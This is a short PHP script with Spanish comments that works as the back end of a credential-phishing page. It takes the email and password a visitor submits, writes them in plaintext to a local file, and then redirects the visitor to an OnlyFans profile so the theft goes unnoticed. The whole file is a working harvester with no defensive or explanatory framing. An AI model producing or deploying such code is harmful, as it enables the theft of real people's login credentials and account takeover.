<?php
// Establece el archivo donde se almacenarán los datos
$file = "data.txt";

// Verifica si el formulario fue enviado
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Obtiene el correo y la contraseña del formulario
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Valida que los campos no estén vacíos
    if (!empty($email) && !empty($password)) {
        // Guarda los datos en un archivo de texto
        $data = "Correo: $email | Contraseña: $password\n";
        file_put_contents($file, $data, FILE_APPEND);

        // Redirige al usuario a OnlyFans
        header("Location: https://onlyfans.com/he6him6jim6");
        exit();
    } else {
        echo "Por favor, completa ambos campos.";
    }
}
?>
